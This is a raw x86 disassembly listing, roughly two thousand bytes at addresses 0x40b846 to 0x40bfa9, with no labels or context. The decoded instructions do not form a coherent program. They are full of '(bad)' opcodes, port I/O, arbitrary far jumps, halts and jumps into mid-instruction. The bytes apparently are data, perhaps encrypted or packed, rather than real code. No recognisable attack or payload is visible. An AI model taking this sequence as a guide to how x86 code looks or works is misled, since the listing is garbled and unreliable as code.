  40b846:	imul   edi,edx,0x1a3a9f3b
  40b84c:	pop    esi
  40b84d:	stc    
  40b84e:	ret    
  40b84f:	jmp    0x40b8ca
  40b851:	sbb    DWORD PTR [esi+0x22],edx
  40b854:	adc    al,0x94
  40b856:	jns    0x40b7eb
  40b858:	pop    ss
  40b859:	cmp    al,0xd4
  40b85b:	adc    ah,ah
  40b85d:	jnp    0x40b8bf
  40b85f:	inc    edx
  40b860:	sbb    bh,BYTE PTR [esi+0x30]
  40b863:	shr    cl,0x26
  40b866:	push   edi
  40b867:	cdq    
  40b868:	icebp  
  40b869:	jmp    0x74cf:0x84258f61
  40b870:	leave  
  40b871:	ret    0x8892
  40b874:	(bad)  
  40b875:	in     eax,dx
  40b876:	pop    ds
  40b877:	inc    eax
  40b878:	aas    
  40b879:	mov    esi,0x9d53ce97
  40b87e:	enter  0x8c61,0x64
  40b882:	dec    edx
  40b883:	out    0xbc,eax
  40b885:	dec    eax
  40b886:	jne    0x40b904
  40b888:	or     dh,dl
  40b88a:	dec    ebp
  40b88b:	or     bl,BYTE PTR [ebp-0x4c5ec60b]
  40b891:	inc    edi
  40b892:	jns    0x40b85b
  40b894:	out    dx,al
  40b895:	sub    BYTE PTR [ebx],dh
  40b897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b898:	arpl   WORD PTR [ebp-0x70977949],si
  40b89e:	in     eax,dx
  40b89f:	and    eax,0x38b81445
  40b8a4:	test   ah,dh
  40b8a6:	xor    ebp,DWORD PTR [ecx+0x10]
  40b8a9:	cmp    eax,0x3767284e
  40b8ae:	xor    eax,0x3d62a669
  40b8b3:	cmp    bh,bl
  40b8b5:	iret   
  40b8b6:	or     ah,BYTE PTR [esi+0x3999b83d]
  40b8bc:	jno    0x40b903
  40b8be:	cs lock push 0x45
  40b8c2:	sbb    bl,dh
  40b8c4:	fistp  WORD PTR [eax+eax*2]
  40b8c7:	adc    ecx,DWORD PTR [edi+0x13]
  40b8ca:	jns    0x40b85d
  40b8cc:	dec    esp
  40b8cd:	mov    ecx,0xc5be632e
  40b8d2:	leave  
  40b8d3:	sbb    DWORD PTR [edx+ebx*1+0x51],ebx
  40b8d7:	rcl    BYTE PTR [ebx-0x57],1
  40b8da:	ret    
  40b8db:	mov    ah,0x15
  40b8dd:	xchg   ebx,eax
  40b8de:	cmp    al,bl
  40b8e0:	push   ebp
  40b8e1:	dec    edi
  40b8e2:	mov    ch,0x1b
  40b8e4:	and    eax,0x33f407ac
  40b8e9:	into   
  40b8ea:	xchg   BYTE PTR [ecx-0x4c],al
  40b8ed:	xchg   esi,eax
  40b8ee:	xchg   BYTE PTR [eax-0x6a],dl
  40b8f1:	mov    bh,0xf1
  40b8f3:	imul   DWORD PTR [edi-0x3a]
  40b8f6:	lds    esi,FWORD PTR [eax]
  40b8f8:	inc    ecx
  40b8f9:	and    ebp,DWORD PTR ds:0x4ff5f0f3
  40b8ff:	je     0x40b8a3
  40b901:	cmp    dh,BYTE PTR [edi-0x73]
  40b904:	or     dl,ch
  40b906:	cld    
  40b907:	add    esp,DWORD PTR [ebp-0x23]
  40b90a:	and    bl,BYTE PTR ds:[edi*4+0x42884680]
  40b912:	xor    al,0x55
  40b914:	xor    al,0xf9
  40b916:	mov    dh,0xcc
  40b918:	data16 fld TBYTE PTR [eax]
  40b91b:	mov    di,WORD PTR [ecx+0x6448a950]
  40b922:	jg     0x40b995
  40b924:	or     al,0xc4
  40b926:	in     eax,0xa2
  40b928:	xchg   edi,eax
  40b929:	push   edi
  40b92a:	stc    
  40b92b:	pop    ss
  40b92c:	lock sub cl,BYTE PTR [eax+0x2ac33430]
  40b933:	and    esi,DWORD PTR [ecx]
  40b935:	or     DWORD PTR [eax-0x145f65ac],esp
  40b93b:	push   ecx
  40b93c:	outs   dx,BYTE PTR ds:[esi]
  40b93d:	and    al,BYTE PTR [edi+0x3a3905b9]
  40b943:	fdiv   QWORD PTR [eax+0x26]
  40b946:	mov    ebp,0x66d41d1b
  40b94b:	cmc    
  40b94c:	xchg   esp,eax
  40b94d:	mov    edx,0x5cfe2e59
  40b952:	jecxz  0x40b989
  40b954:	xchg   esp,eax
  40b955:	mov    eax,0xc01d1a4e
  40b95a:	test   BYTE PTR ss:[edx-0x3e486a02],dl
  40b961:	pop    ss
  40b962:	mov    al,ds:0xa627dbc3
  40b967:	push   es
  40b968:	lods   al,BYTE PTR ds:[esi]
  40b969:	sbb    DWORD PTR [edx],ebp
  40b96b:	fdivr  QWORD PTR [ebp-0x73]
  40b96e:	frstor [edx+0x22]
  40b971:	xchg   ebx,eax
  40b972:	icebp  
  40b973:	das    
  40b974:	std    
  40b975:	add    esi,ebp
  40b977:	xor    al,BYTE PTR [ecx+0x56009ec6]
  40b97d:	loop   0x40b9ee
  40b97f:	and    DWORD PTR [ecx],ecx
  40b981:	jnp    0x40b95a
  40b983:	(bad)  
  40b984:	mov    DWORD PTR [ecx],esp
  40b986:	dec    edx
  40b987:	xor    ah,BYTE PTR [ecx-0x7f]
  40b98a:	push   0xffffffed
  40b98c:	pushf  
  40b98d:	mov    ?,WORD PTR [ebp-0x21410b8a]
  40b993:	push   esp
  40b994:	cli    
  40b995:	inc    esi
  40b996:	mov    ebx,DWORD PTR [edi+eax*4]
  40b999:	fdiv   QWORD PTR [edx]
  40b99b:	sub    edi,DWORD PTR [ecx-0x5074e380]
  40b9a1:	xchg   ebx,eax
  40b9a2:	outs   dx,BYTE PTR ds:[esi]
  40b9a3:	sbb    ebp,DWORD PTR [edi]
  40b9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9a6:	out    dx,al
  40b9a7:	or     BYTE PTR [ebp-0x1ddbf7d6],cl
  40b9ad:	sbb    DWORD PTR [ebp+0x67],edi
  40b9b0:	adc    DWORD PTR [ecx-0x58],ebp
  40b9b3:	sbb    ah,BYTE PTR [ecx]
  40b9b5:	or     ebx,DWORD PTR [ebx+0x6102894b]
  40b9bb:	shr    BYTE PTR [ecx],cl
  40b9bd:	fs push ss
  40b9bf:	xchg   ebp,eax
  40b9c0:	jnp    0x40b968
  40b9c2:	je     0x40ba42
  40b9c4:	mov    edi,ebx
  40b9c6:	test   DWORD PTR [ecx-0x66],esp
  40b9c9:	add    dl,al
  40b9cb:	mov    esp,0xf63920c5
  40b9d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d1:	mov    bh,0x4b
  40b9d3:	xor    BYTE PTR [ebp+edx*2+0x7c],cl
  40b9d7:	lds    esi,FWORD PTR [eax+0x6d]
  40b9da:	push   ss
  40b9db:	add    al,0xe
  40b9dd:	dec    eax
  40b9de:	jae    0x40ba3c
  40b9e0:	sub    DWORD PTR ds:0x641ed0fc,edx
  40b9e6:	mov    edx,0x62080638
  40b9eb:	push   ebx
  40b9ec:	out    0xaa,eax
  40b9ee:	ins    DWORD PTR es:[edi],dx
  40b9ef:	or     eax,0xc4002891
  40b9f4:	dec    edx
  40b9f5:	stos   DWORD PTR es:[edi],eax
  40b9f6:	inc    esp
  40b9f7:	lds    ebx,FWORD PTR [esi-0x29bce1c4]
  40b9fd:	popf   
  40b9fe:	sar    BYTE PTR [eax+0x11],1
  40ba01:	test   DWORD PTR [ebx-0x952526d],0x49c62adf
  40ba0b:	enter  0xe707,0x9a
  40ba0f:	ret    0x5b71
  40ba12:	push   0xffffffbd
  40ba14:	popf   
  40ba15:	mov    al,0xc2
  40ba17:	push   ebx
  40ba18:	pop    edi
  40ba19:	cwde   
  40ba1a:	jge    0x40ba1e
  40ba1c:	sar    DWORD PTR [eax-0x2f],0xa4
  40ba20:	jne    0x40b9eb
  40ba22:	push   ss
  40ba23:	sub    eax,0x58284e42
  40ba28:	imul   eax,DWORD PTR [edx-0x4a],0x74690660
  40ba2f:	xor    BYTE PTR [ebx-0x34],0xe
  40ba33:	adc    DWORD PTR [ecx],0xffffffe5
  40ba36:	retf   0xeb48
  40ba39:	xor    al,bl
  40ba3b:	xlat   BYTE PTR ds:[ebx]
  40ba3c:	and    BYTE PTR [ebp+0x5a],0xe6
  40ba40:	mov    dh,0xe2
  40ba42:	mov    dl,0x6d
  40ba44:	add    cl,ch
  40ba46:	xor    eax,0xbfbd395e
  40ba4b:	dec    esp
  40ba4c:	jmp    0x40ba2a
  40ba4e:	imul   edi,DWORD PTR [ebx+0x5a83dc90],0xffffffe4
  40ba55:	push   es
  40ba56:	pop    ecx
  40ba57:	addr16 repz xor al,dl
  40ba5b:	xchg   ebx,eax
  40ba5c:	popf   
  40ba5d:	mov    ebp,0x4cfd1a43
  40ba62:	dec    ebp
  40ba63:	adc    cl,ah
  40ba65:	je     0x40bad2
  40ba67:	ret    
  40ba68:	pop    ss
  40ba69:	popa   
  40ba6a:	ins    DWORD PTR es:[edi],dx
  40ba6b:	mov    ch,0x75
  40ba6d:	mov    WORD PTR [edx-0x29],?
  40ba70:	xchg   ebp,eax
  40ba71:	inc    eax
  40ba72:	dec    ebp
  40ba73:	adc    ebx,DWORD PTR gs:[ebx-0x1c]
  40ba77:	pop    esi
  40ba78:	clc    
  40ba79:	into   
  40ba7a:	xchg   edi,eax
  40ba7b:	int3   
  40ba7c:	stc    
  40ba7d:	das    
  40ba7e:	mov    esi,0xd5d2823f
  40ba83:	test   DWORD PTR ds:0xc72a62b6,0x909177b5
  40ba8d:	arpl   WORD PTR [ecx-0x3a],cx
  40ba90:	int    0x27
  40ba92:	xchg   ecx,eax
  40ba93:	add    eax,ebp
  40ba95:	sbb    eax,0x7497b902
  40ba9a:	nop
  40ba9b:	or     eax,0xd1055ddf
  40baa0:	rcr    DWORD PTR [esp+edi*1-0x54],1
  40baa4:	ss and eax,0xe2999d83
  40baaa:	sbb    bh,BYTE PTR [edx-0x52]
  40baad:	lods   eax,DWORD PTR ds:[esi]
  40baae:	aas    
  40baaf:	and    BYTE PTR [edx+0x6a8ede35],bh
  40bab5:	sbb    BYTE PTR [edi-0x3e718eaa],bh
  40babb:	(bad)  
  40babc:	inc    edi
  40babd:	mov    al,0x96
  40babf:	outs   dx,DWORD PTR ds:[esi]
  40bac0:	pop    esi
  40bac1:	cli    
  40bac2:	fnstsw WORD PTR [ebp+0x18]
  40bac5:	ret    0x8162
  40bac8:	push   cs
  40bac9:	test   DWORD PTR [edi+0x58],ecx
  40bacc:	call   0xfe189bb8
  40bad1:	pop    ecx
  40bad2:	leave  
  40bad3:	mov    BYTE PTR [edi-0x66],al
  40bad6:	call   0x7ad6:0x2e021d1c
  40badd:	dec    ebp
  40bade:	or     BYTE PTR [ecx+0x25289ad3],cl
  40bae4:	in     al,0x6
  40bae6:	sbb    eax,0xbf7ff2e7
  40baeb:	fldcw  WORD PTR [ebx-0x2a]
  40baee:	sbb    ebp,DWORD PTR [edx]
  40baf0:	das    
  40baf1:	cmp    DWORD PTR [ecx-0x12],esp
  40baf4:	dec    ebp
  40baf5:	stc    
  40baf6:	lods   al,BYTE PTR ds:[esi]
  40baf7:	xor    eax,0x4dcf2e43
  40bafc:	adc    DWORD PTR ds:0x16bac868,ebp
  40bb02:	dec    esp
  40bb03:	retf   
  40bb04:	repnz fsubr DWORD PTR [esi-0xf7e44c8]
  40bb0b:	jmp    DWORD PTR [edi-0x3d0a55a2]
  40bb11:	lahf   
  40bb12:	or     BYTE PTR [eax+0x1c],bh
  40bb15:	push   ds
  40bb16:	ficomp DWORD PTR [edx+eax*2]
  40bb19:	jns    0x40bab0
  40bb1b:	(bad)  
  40bb1d:	add    edx,DWORD PTR [edi+0x6c7dafc1]
  40bb23:	dec    edx
  40bb24:	lods   al,BYTE PTR ds:[esi]
  40bb25:	pop    eax
  40bb26:	lods   ax,WORD PTR ds:[esi]
  40bb28:	jp     0x40bad6
  40bb2a:	(bad)  
  40bb2b:	addr16 jmp 0x6a89:0x465cf6b
  40bb33:	inc    eax
  40bb34:	push   esi
  40bb35:	das    
  40bb36:	fs in  al,dx
  40bb38:	inc    ecx
  40bb39:	inc    edx
  40bb3a:	pop    es
  40bb3b:	mov    al,ds:0x526e0882
  40bb40:	push   ds
  40bb41:	cmp    al,0x61
  40bb43:	fs js  0x40bb48
  40bb46:	rcl    BYTE PTR [edx],cl
  40bb48:	jg     0x40bb44
  40bb4a:	arpl   ax,di
  40bb4c:	nop
  40bb4d:	jns    0x40bb8a
  40bb4f:	sti    
  40bb50:	adc    DWORD PTR [esi-0x18],ecx
  40bb53:	out    dx,al
  40bb54:	xor    BYTE PTR ds:0x169df68,0xe4
  40bb5b:	mov    esp,0x2d6ef62b
  40bb60:	ja     0x40bbc6
  40bb62:	jnp    0x40bb29
  40bb64:	jg     0x40bafb
  40bb66:	pushf  
  40bb67:	jnp    0x40bba4
  40bb69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb6a:	and    eax,0xc473252c
  40bb6f:	jae    0x40bb70
  40bb71:	fs pop ebp
  40bb73:	and    eax,0x7dbe46af
  40bb78:	ins    BYTE PTR es:[edi],dx
  40bb79:	xchg   edx,eax
  40bb7a:	cmp    eax,0xb232f4df
  40bb7f:	loope  0x40bbfc
  40bb81:	fnop   
  40bb83:	stos   DWORD PTR es:[edi],eax
  40bb84:	sbb    eax,0x11c1bd20
  40bb89:	jle    0x40bbb8
  40bb8b:	les    eax,FWORD PTR [ebx]
  40bb8d:	or     BYTE PTR [edi+ebp*8-0x79],dh
  40bb91:	popf   
  40bb92:	aam    0x7b
  40bb94:	into   
  40bb95:	sbb    eax,0x1ce64dc9
  40bb9a:	mov    ds:0xdc3359b0,eax
  40bb9f:	aad    0x67
  40bba1:	out    0x36,al
  40bba3:	dec    edi
  40bba4:	ja     0x40bb47
  40bba6:	jge    0x40bb83
  40bba8:	sbb    ch,al
  40bbaa:	rcl    bh,cl
  40bbac:	ja     0x40bb87
  40bbae:	(bad)  
  40bbaf:	punpckhbw mm1,mm3
  40bbb2:	mov    cl,0xee
  40bbb4:	pop    edx
  40bbb5:	mov    bh,0x38
  40bbb7:	add    cl,BYTE PTR [eax]
  40bbb9:	sub    DWORD PTR [edi-0x1b],ebp
  40bbbc:	ins    BYTE PTR es:[edi],dx
  40bbbd:	mov    ah,0xa6
  40bbbf:	aad    0xce
  40bbc1:	and    eax,0x6c05469c
  40bbc6:	xor    ah,dh
  40bbc8:	ss and cl,dl
  40bbcb:	leave  
  40bbcc:	cli    
  40bbcd:	pop    esi
  40bbce:	jle    0x40bb57
  40bbd0:	lods   eax,DWORD PTR ds:[esi]
  40bbd1:	ds test eax,0x8ed9008
  40bbd7:	test   al,0x7b
  40bbd9:	push   ebp
  40bbda:	and    edi,DWORD PTR [edx+0x1315544d]
  40bbe0:	call   0x6166ed0e
  40bbe5:	icebp  
  40bbe6:	xor    eax,0xab314f02
  40bbeb:	pop    edi
  40bbec:	push   cs
  40bbed:	pop    ebp
  40bbee:	add    edx,DWORD PTR [edx]
  40bbf0:	popa   
  40bbf1:	mov    al,ds:0x80bd2934
  40bbf6:	add    al,0x3b
  40bbf8:	adc    ebx,ebx
  40bbfa:	or     ah,BYTE PTR [eax]
  40bbfc:	mov    esi,0x15558018
  40bc02:	hlt    
  40bc03:	and    al,0x88
  40bc05:	not    WORD PTR fs:[esi]
  40bc09:	into   
  40bc0a:	jo     0x40bbb1
  40bc0c:	or     al,0x98
  40bc0e:	xchg   edi,eax
  40bc0f:	pop    ss
  40bc10:	bound  edi,QWORD PTR [edx+ecx*1-0x660fee5e]
  40bc17:	push   ebx
  40bc18:	not    DWORD PTR [esi-0x2b]
  40bc1b:	cmp    cl,dh
  40bc1d:	pop    esp
  40bc1e:	dec    ebp
  40bc1f:	sbb    edi,ecx
  40bc21:	je     0x40bc77
  40bc23:	sbb    DWORD PTR [edx+0x4e261867],esp
  40bc29:	mov    esp,0xc7957e99
  40bc2e:	mov    ecx,0x8858c133
  40bc33:	stc    
  40bc34:	and    eax,0xb076e3ab
  40bc3a:	aaa    
  40bc3b:	(bad)  
  40bc3c:	push   esp
  40bc3d:	ins    BYTE PTR es:[edi],dx
  40bc3e:	loop   0x40bca6
  40bc40:	mov    edi,0xc887f033
  40bc45:	outs   dx,DWORD PTR ds:[esi]
  40bc46:	ins    DWORD PTR es:[edi],dx
  40bc47:	mov    ebp,ebx
  40bc49:	mov    dh,0xad
  40bc4b:	mov    esi,0x74244f4d
  40bc50:	jle    0x40bc04
  40bc52:	jns    0x40bc22
  40bc54:	add    BYTE PTR [edi-0x7],bl
  40bc57:	fst    st(7)
  40bc59:	loope  0x40bc72
  40bc5b:	sub    DWORD PTR ds:0xf0846cda,ecx
  40bc61:	cmp    eax,0xacb48db4
  40bc66:	sbb    ch,BYTE PTR ds:0xe23b2e9e
  40bc6c:	mov    edi,0xca557679
  40bc71:	jmp    0xb701a2af
  40bc76:	(bad)  
  40bc77:	test   eax,0x7201136d
  40bc7c:	cmp    eax,0x423f1b02
  40bc81:	lods   al,BYTE PTR ds:[esi]
  40bc82:	js     0x40bc59
  40bc84:	push   esp
  40bc85:	lods   eax,DWORD PTR ds:[esi]
  40bc86:	cmp    bh,BYTE PTR [esi+edi*2]
  40bc89:	or     DWORD PTR [ecx],esi
  40bc8b:	imul   ebx,eax,0x58
  40bc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc8f:	jb     0x40bc46
  40bc91:	leave  
  40bc92:	outs   dx,DWORD PTR ds:[esi]
  40bc93:	jle    0x40bc64
  40bc95:	in     al,0xb7
  40bc97:	mov    bl,0xbf
  40bc99:	and    BYTE PTR [eax],al
  40bc9b:	sbb    al,0x74
  40bc9d:	std    
  40bc9e:	push   cs
  40bc9f:	jle    0x40bcca
  40bca1:	cmc    
  40bca2:	sti    
  40bca3:	loope  0x40bc4d
  40bca5:	push   esi
  40bca6:	pop    esp
  40bca7:	adc    ebp,ebp
  40bca9:	lock jne 0x40bcd4
  40bcac:	neg    BYTE PTR [ebp+0x60]
  40bcaf:	pushf  
  40bcb0:	jle    0x40bca9
  40bcb2:	rcr    BYTE PTR [edi*2-0x347492fa],0x75
  40bcba:	dec    ebx
  40bcbb:	add    cl,bh
  40bcbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcbe:	inc    esi
  40bcbf:	jns    0x40bc72
  40bcc1:	cld    
  40bcc2:	(bad)  
  40bcc3:	enter  0xbe6e,0xe3
  40bcc7:	adc    ebx,ebx
  40bcc9:	adc    DWORD PTR [edx+edx*1-0x40],ebp
  40bccd:	repz jge 0x40bd1e
  40bcd0:	cli    
  40bcd1:	mov    esi,0xfbb94309
  40bcd6:	hlt    
  40bcd7:	push   ss
  40bcd8:	(bad)  
  40bcd9:	sar    BYTE PTR [edi+0x2a],0xe3
  40bcdd:	mov    ah,0xa2
  40bcdf:	push   cs
  40bce0:	inc    ecx
  40bce1:	fwait
  40bce2:	retf   
  40bce3:	jns    0x40bd2f
  40bce5:	sbb    ah,ah
  40bce7:	cdq    
  40bce8:	xor    DWORD PTR [eax+0x18],ebp
  40bceb:	adc    al,0x14
  40bced:	or     DWORD PTR [esi-0x2f],0x83ae7ac2
  40bcf4:	rcl    BYTE PTR [ebx-0x79],1
  40bcf7:	stos   BYTE PTR es:[edi],al
  40bcf8:	jo     0x40bcbc
  40bcfa:	pop    esi
  40bcfb:	pop    edx
  40bcfc:	pop    edx
  40bcfd:	inc    ecx
  40bcfe:	out    dx,al
  40bcff:	cmp    cl,BYTE PTR [bp+di+0x1f4c]
  40bd04:	and    eax,0x898a5aee
  40bd09:	imul   ebx,eax,0x5a4cbe0b
  40bd0f:	sti    
  40bd10:	add    BYTE PTR [edi+0xa],0x7f
  40bd14:	mov    esp,0xeb865cd7
  40bd19:	sbb    al,0xfc
  40bd1b:	cld    
  40bd1c:	pop    ebp
  40bd1d:	sbb    ebx,DWORD PTR [esp+ebx*8]
  40bd20:	js     0x40bd49
  40bd22:	fdivr  st(7),st
  40bd24:	mov    eax,ds:0xe3095150
  40bd29:	push   0x26
  40bd2b:	dec    edx
  40bd2c:	mov    bh,0x5f
  40bd2e:	jg     0x40bcf0
  40bd30:	and    eax,0xdfbcfcf0
  40bd35:	xor    eax,0x36ab40c
  40bd3a:	adc    ah,BYTE PTR [esi-0x2d]
  40bd3d:	(bad)  
  40bd3e:	jmp    0x3edbe410
  40bd43:	dec    edx
  40bd44:	push   edx
  40bd45:	enter  0x5b8f,0x6
  40bd49:	aas    
  40bd4a:	mov    DWORD PTR [ebx+0x302faae5],edi
  40bd50:	pop    ds
  40bd51:	je     0x40bdc9
  40bd53:	adc    al,0x17
  40bd55:	iret   
  40bd56:	ins    DWORD PTR es:[edi],dx
  40bd57:	mov    gs,WORD PTR [ebx]
  40bd59:	mov    DWORD PTR [eax-0x323ece0e],ebp
  40bd5f:	pop    ecx
  40bd60:	leave  
  40bd61:	mov    dl,0xc9
  40bd63:	sbb    DWORD PTR [edi+edi*8],edi
  40bd66:	jnp    0x40bcf0
  40bd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd69:	stos   DWORD PTR es:[edi],eax
  40bd6a:	jmp    0x40bd08
  40bd6c:	adc    DWORD PTR [edi+0xd18dcd],eax
  40bd72:	nop
  40bd73:	xchg   BYTE PTR [ecx],al
  40bd75:	pop    esi
  40bd76:	push   ss
  40bd77:	out    dx,eax
  40bd78:	xchg   esp,eax
  40bd79:	adc    ah,cl
  40bd7b:	test   BYTE PTR [esi-0x220b3fc6],bl
  40bd81:	xchg   edi,eax
  40bd82:	lock push edx
  40bd84:	out    dx,eax
  40bd85:	sub    BYTE PTR [esi-0x42431c35],0x92
  40bd8c:	adc    eax,0x826f3886
  40bd91:	jmp    0xaa74:0xc6a838db
  40bd98:	lods   al,BYTE PTR ds:[esi]
  40bd99:	pop    es
  40bd9a:	jno    0x40bdbe
  40bd9c:	std    
  40bd9d:	add    BYTE PTR [ecx],ch
  40bd9f:	clc    
  40bda0:	call   FWORD PTR [ebx+0x65]
  40bda3:	test   DWORD PTR [edx-0x3d5acffd],ebp
  40bda9:	pop    ecx
  40bdaa:	popa   
  40bdab:	loope  0x40bd80
  40bdad:	mov    ch,0xb0
  40bdaf:	jae    0x40bda6
  40bdb1:	pop    es
  40bdb2:	xchg   ebp,eax
  40bdb3:	and    al,BYTE PTR [edi+edx*4-0x14]
  40bdb7:	shl    DWORD PTR [esi-0x5932320c],1
  40bdbd:	test   BYTE PTR [ebx-0x697593ad],ch
  40bdc3:	xor    ebp,DWORD PTR [esi-0x7a]
  40bdc6:	jmp    0x9ad239a1
  40bdcb:	mov    ecx,0xad0a5410
  40bdd0:	mov    eax,0xd82646ae
  40bdd5:	push   cs
  40bdd6:	fs xchg edi,eax
  40bdd8:	dec    ecx
  40bdd9:	scas   eax,DWORD PTR es:[edi]
  40bdda:	sub    BYTE PTR [ebx+0x62],al
  40bddd:	jmp    0x9e4a661
  40bde2:	test   eax,0xe4ca5649
  40bde7:	ret    
  40bde8:	into   
  40bde9:	pop    ds
  40bdea:	pop    edx
  40bdeb:	xor    dl,bl
  40bded:	jp     0x40be51
  40bdef:	push   es
  40bdf0:	inc    edx
  40bdf1:	out    dx,al
  40bdf2:	or     bh,cl
  40bdf4:	dec    edi
  40bdf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf6:	test   BYTE PTR [edx-0x103307e2],ah
  40bdfc:	mov    ecx,0xd847454c
  40be01:	or     DWORD PTR [ebp+0x7f6b982e],eax
  40be07:	xchg   ecx,eax
  40be08:	out    0xf6,al
  40be0a:	mov    esi,ss
  40be0c:	es iret 
  40be0e:	repnz cmp ah,BYTE PTR [edi-0x8]
  40be12:	push   ebx
  40be13:	call   0x891f14e7
  40be18:	adc    dh,BYTE PTR [esi]
  40be1a:	adc    eax,0xeca9ae73
  40be1f:	clc    
  40be20:	in     eax,0xd0
  40be22:	push   esp
  40be23:	cmp    DWORD PTR [ecx+0x1ecc6367],eax
  40be29:	fdivr  QWORD PTR [edx]
  40be2b:	mov    bl,0x7a
  40be2d:	push   edx
  40be2e:	push   ebp
  40be2f:	fdiv   QWORD PTR [ecx-0x57]
  40be32:	sub    eax,0x2ab57412
  40be37:	rcl    DWORD PTR [ebx],cl
  40be39:	mov    edx,0x92f90545
  40be3e:	addr16 out dx,al
  40be40:	and    bl,0xef
  40be43:	and    eax,0x70666d04
  40be48:	loopne 0x40be67
  40be4a:	retf   0x8055
  40be4d:	in     al,0x98
  40be4f:	pop    es
  40be50:	cmp    al,0x58
  40be52:	jle    0x40bdf1
  40be54:	mov    esp,0x8ce4e889
  40be59:	fchs   
  40be5b:	lds    eax,FWORD PTR [ecx+0x68]
  40be5e:	fbstp  TBYTE PTR [edi-0x5b9edd50]
  40be64:	pop    ebx
  40be65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be66:	sar    DWORD PTR [ebx+0x360bd1b5],1
  40be6c:	es clc 
  40be6e:	mov    cs,WORD PTR [ecx]
  40be70:	jbe    0x40be00
  40be72:	adc    esi,DWORD PTR [eax]
  40be74:	or     al,0xf9
  40be76:	repnz cmp al,BYTE PTR [ebx-0x61]
  40be7a:	jmp    0x8fa:0x38485651
  40be81:	js     0x40beb2
  40be83:	mov    ecx,0x65808b2d
  40be88:	push   ecx
  40be89:	rol    DWORD PTR ds:[esi],cl
  40be8c:	pop    esp
  40be8d:	mov    BYTE PTR [ecx+0x6460b7d7],al
  40be93:	aaa    
  40be94:	(bad)  
  40be95:	inc    edx
  40be96:	sub    al,0xc5
  40be98:	xchg   ebx,eax
  40be99:	mov    DWORD PTR [ecx+0x32],ebx
  40be9c:	les    eax,FWORD PTR [edx-0x1a]
  40be9f:	cld    
  40bea0:	mov    DWORD PTR [edx],ebx
  40bea2:	(bad)  
  40bea3:	adc    BYTE PTR [edx],cl
  40bea5:	pop    ebx
  40bea6:	and    al,0xe3
  40bea8:	sub    eax,0x9621d57d
  40bead:	cli    
  40beae:	lods   al,BYTE PTR ds:[esi]
  40beaf:	or     BYTE PTR [esi],ah
  40beb1:	inc    esi
  40beb2:	repnz test esp,esi
  40beb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beb6:	ret    0x8de8
  40beb9:	in     al,dx
  40beba:	pop    esp
  40bebb:	std    
  40bebc:	sahf   
  40bebd:	mov    ebp,es
  40bebf:	inc    di
  40bec1:	fistp  DWORD PTR [edx-0x26d45410]
  40bec7:	icebp  
  40bec8:	test   al,0xb7
  40beca:	nop
  40becb:	cwde   
  40becc:	sub    eax,0x66d9f4b2
  40bed1:	xchg   DWORD PTR [edi],esp
  40bed3:	push   es
  40bed4:	les    ebx,FWORD PTR [ebx]
  40bed6:	jno    0x40bf1f
  40bed8:	icebp  
  40bed9:	push   ebx
  40beda:	mov    bl,0x60
  40bedc:	adc    al,0x40
  40bede:	imul   ecx,DWORD PTR [ecx+0x1a441098],0xc9dd591
  40bee8:	add    BYTE PTR [ebx],dh
  40beea:	xor    al,0x57
  40beec:	mov    ah,0x76
  40beee:	sub    dl,dh
  40bef0:	sub    dh,bh
  40bef2:	jmp    0xc5a9926f
  40bef7:	adc    al,0x96
  40bef9:	dec    ebx
  40befa:	test   DWORD PTR [ebx+0x2e],ebp
  40befd:	out    0x7e,al
  40beff:	out    dx,eax
  40bf00:	inc    esi
  40bf01:	xchg   ecx,eax
  40bf02:	cli    
  40bf03:	jmp    0xc9c6:0x127b6a75
  40bf0a:	hlt    
  40bf0b:	call   0x165f158d
  40bf10:	adc    dh,BYTE PTR [eax]
  40bf12:	and    al,0xdc
  40bf14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf15:	dec    ebp
  40bf16:	adc    esp,ebx
  40bf18:	addr16 sar al,cl
  40bf1b:	pop    ds
  40bf1c:	scas   al,BYTE PTR es:[edi]
  40bf1d:	mov    ds:0xfa76e12e,al
  40bf22:	mov    eax,0xdfecd5e7
  40bf27:	jne    0x40bfa6
  40bf29:	dec    ebp
  40bf2a:	jmp    0x31c5fc0c
  40bf2f:	call   0x25fd:0x3bca51f7
  40bf36:	(bad)  
  40bf37:	jmp    0x772d:0x50d0698f
  40bf3e:	dec    eax
  40bf3f:	dec    esp
  40bf40:	lods   eax,DWORD PTR ds:[esi]
  40bf41:	sub    eax,0x58cc7fef
  40bf46:	xchg   ecx,eax
  40bf47:	jae    0x40befe
  40bf49:	ret    0x88ac
  40bf4c:	jb     0x40bf45
  40bf4e:	lock jb 0x40bf89
  40bf51:	rol    bl,1
  40bf53:	(bad)  
  40bf54:	sub    al,0xa9
  40bf56:	add    eax,0x8a5e9710
  40bf5b:	sti    
  40bf5c:	pop    esp
  40bf5d:	xchg   DWORD PTR [edi+0x77],esi
  40bf60:	repz jns 0x40bf73
  40bf63:	ds pop ds
  40bf65:	dec    ebp
  40bf66:	retf   0x268d
  40bf69:	loop   0x40bf9c
  40bf6b:	adc    BYTE PTR [eax-0x1196a68a],bh
  40bf71:	mul    DWORD PTR [edx-0x7c]
  40bf74:	rcr    BYTE PTR [eax-0x7d641c47],cl
  40bf7a:	push   0xfc873685
  40bf7f:	sbb    BYTE PTR [edi+0x43747da8],dl
  40bf85:	sub    DWORD PTR [edi+0x499c58c3],esi
  40bf8b:	outs   dx,BYTE PTR ds:[esi]
  40bf8c:	out    dx,eax
  40bf8d:	mov    al,ds:0xfc25a223
  40bf92:	and    DWORD PTR [edx+0x47],esp
  40bf95:	xor    al,0x1a
  40bf97:	sub    dl,BYTE PTR [ecx+0x5c]
  40bf9a:	fcomp  DWORD PTR [eax]
  40bf9c:	cmp    DWORD PTR [ecx-0x2],edx
  40bf9f:	rol    BYTE PTR [ebx],1
  40bfa1:	or     ecx,esp
  40bfa3:	xor    eax,0xe02a880b
  40bfa8:	aas    
  40bfa9:	jne    0x40bfe9
